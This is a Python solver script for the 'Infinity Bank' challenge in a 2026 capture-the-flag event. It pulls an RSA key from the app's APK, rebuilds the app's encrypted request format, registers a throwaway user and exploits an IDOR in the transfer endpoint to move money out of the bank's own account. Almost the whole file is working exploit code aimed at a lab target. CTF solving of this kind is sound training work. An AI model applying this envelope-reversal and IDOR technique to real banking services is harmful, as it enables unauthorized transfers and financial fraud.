#!/usr/bin/env python3
"""
Infinity Bank solver — Infodays 2026 CTF.

Steps:
    1. Extract the RSA public key from dist/infinity-bank.apk (libapp.so).
    2. Reimplement the AES-CBC + RSA-OAEP(SHA-256) envelope protocol.
    3. Register a fresh user, log in, read our account number.
    4. IDOR the transfer endpoint — from_account = 93478541 (bank's account).
    5. Flag comes back as the transaction remark.

Usage:
    python3 solve.py [host[:port]]                # defaults to 127.0.0.1:8080
    python3 solve.py http://target:port/api/v1    # full base URL
"""
from __future__ import annotations

import base64
import hashlib
import json
import os
import random
import re
import secrets
import string
import sys
import zipfile
from pathlib import Path

import requests
import urllib3
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


BANK_ACCOUNT = 93478541  # from the Dart decompilation
APK_PATH = Path(__file__).resolve().parent.parent / "dist" / "infinity-bank.apk"


def extract_pubkey_from_apk(apk: Path) -> bytes:
    """Pull the PEM-encoded RSA public key out of libapp.so."""
    pem_re = re.compile(rb"-----BEGIN PUBLIC KEY-----.*?-----END PUBLIC KEY-----", re.S)
    with zipfile.ZipFile(apk) as zf:
        for name in ("lib/arm64-v8a/libapp.so", "lib/armeabi-v7a/libapp.so", "lib/x86_64/libapp.so"):
            try:
                data = zf.read(name)
            except KeyError:
                continue
            m = pem_re.search(data)
            if m:
                return m.group(0)
    raise RuntimeError("no PUBLIC KEY block found in APK")


def resolve_base_url(arg: str | None) -> str:
    if not arg:
        return "http://127.0.0.1:8080/api/v1"
    if arg.startswith(("http://", "https://")):
        return arg.rstrip("/")
    return f"http://{arg}/api/v1"


class Client:
    def __init__(self, base_url: str, pubkey_pem: bytes) -> None:
        self.base_url = base_url
        self.rsa = PKCS1_OAEP.new(RSA.import_key(pubkey_pem), hashAlgo=SHA256)
        self.token: str | None = None

    def _rsa_wrap(self, raw: bytes) -> str:
        inner = base64.b64encode(raw)
        outer = self.rsa.encrypt(inner)
        return base64.b64encode(outer).decode()

    def send(self, endpoint: str, payload: dict) -> dict:
        key = secrets.token_bytes(32)
        iv = secrets.token_bytes(16)
        salt = secrets.token_bytes(16)
        plaintext = json.dumps(payload, separators=(",", ":")).encode()
        ciphertext = base64.b64encode(
            AES.new(key, AES.MODE_CBC, iv).encrypt(pad(plaintext, AES.block_size))
        ).decode()
        headers = {
            "Content-Type": "text/plain",
            "Host": "infinity-bank.lab",
            "KEY": self._rsa_wrap(key),
            "IV": self._rsa_wrap(iv),
            "SALT": self._rsa_wrap(salt),
            "SIGNATURE": hashlib.sha256(plaintext).hexdigest(),
        }
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"

        url = f"{self.base_url}/{endpoint}"
        resp = requests.post(url, data=ciphertext, headers=headers, verify=False, timeout=15)
        body = resp.text.strip()
        if not body:
            return {"_status": resp.status_code}
        try:
            decrypted = unpad(
                AES.new(key, AES.MODE_CBC, iv).decrypt(base64.b64decode(body)),
                AES.block_size,
            )
            return json.loads(decrypted)
        except Exception as exc:
            return {"_status": resp.status_code, "_raw": body[:200], "_err": repr(exc)}


def solve(base_url: str) -> str:
    pub = extract_pubkey_from_apk(APK_PATH)
    print(f"[+] pub key from APK: {pub[:60].decode()}... ({len(pub)} bytes)")
    cli = Client(base_url, pub)

    rnd = "".join(random.choices(string.ascii_lowercase, k=8))
    email = f"pwn{rnd}@lab.local"
    pwd = "Passw0rd1234"

    print(f"[+] registering {email}")
    reg = cli.send("user/register", {
        "device_id": f"device-{rnd}",
        "email": email,
        "first_name": "Hack",
        "middle_name": "X",
        "last_name": "TheBox",
        "password": pwd,
        "username": f"pwn{rnd}",
    })
    print(f"    -> {reg}")

    print(f"[+] logging in")
    login = cli.send("login", {"email": email, "password": pwd})
    cli.token = login["token"]
    print(f"    token: {cli.token[:24]}...")

    me = cli.send("user/me", {"token": cli.token})
    my_acc = me["account"]["account_number"]
    print(f"[+] my account: {my_acc} (balance {me['account']['balance']})")

    print(f"[+] IDOR: transfer 1337.0 from bank ({BANK_ACCOUNT}) -> {my_acc}")
    result = cli.send("transaction/transfer", {
        "amount": 1337.0,
        "auth": {"token": cli.token},
        "from_account": BANK_ACCOUNT,
        "to_account": my_acc,
        "remark": "flag please",
    })
    print(f"    -> {json.dumps(result, indent=2)}")

    m = re.search(r"INFODAYS\{[^}]+\}", json.dumps(result))
    if not m:
        raise SystemExit("no flag found in response")
    return m.group(0)


def main() -> int:
    base = resolve_base_url(sys.argv[1] if len(sys.argv) > 1 else os.environ.get("TARGET"))
    print(f"[+] target: {base}")
    flag = solve(base)
    print(f"\nFLAG: {flag}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
